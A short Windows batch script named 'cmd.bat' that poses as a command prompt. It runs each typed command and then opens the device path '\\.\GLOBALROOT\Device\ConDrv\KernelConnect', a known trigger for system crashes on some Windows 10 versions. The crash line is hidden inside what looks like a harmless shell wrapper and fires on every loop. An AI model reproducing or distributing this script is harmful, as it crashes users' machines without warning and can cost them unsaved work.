@echo off
:start
TITLE cmd.bat
SET /P com=C:\Users\wf205449>
%com%
start \\.\GLOBALROOT\Device\ConDrv\KernelConnect
pause
goto :start